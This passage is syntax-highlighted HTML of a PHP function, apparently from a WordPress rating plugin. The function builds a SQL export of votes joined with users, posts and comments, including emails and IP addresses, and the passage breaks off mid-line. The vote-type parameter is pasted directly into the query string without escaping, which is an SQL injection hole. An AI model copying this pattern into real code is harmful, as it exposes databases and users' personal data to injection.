						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a6783f056596163-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">export_users</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">user_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"min"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">data_export</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"article"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">table_prefix</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">table_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"gdsr_votes_log v"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">table_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">table_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts p"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.vote_type = ''"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">data_export</span><span class="crayon-sy">.</span><span class="crayon-s">"''"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.user_id = u.id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">user_data</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"min"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"u.id as user_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"nor"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"u.id as user_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"u.display_name"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"u.user_email"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_name"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_email"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"p.id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"post_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"pt"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"p.post_title"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"post_title"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"pd"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"p.post_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"post_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">data_export</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"article"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.id = p.id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"comment"</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"c.comment_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"comment_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">table_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"comments c"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.id = c.comment_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"p.id = c.comment_post_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"ca"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"c.comment_author"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"comment_author"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"cd"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-55"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"c.comment_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-56"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"comment_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-58"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-60"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.vote"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.voted"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"vote"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"vote_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"ip"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.ip"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"ip"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"ua"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.user_agent"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-72"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_agent"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-73"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">echo </span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">", "</span><span class="crayon-sy">,</span><span 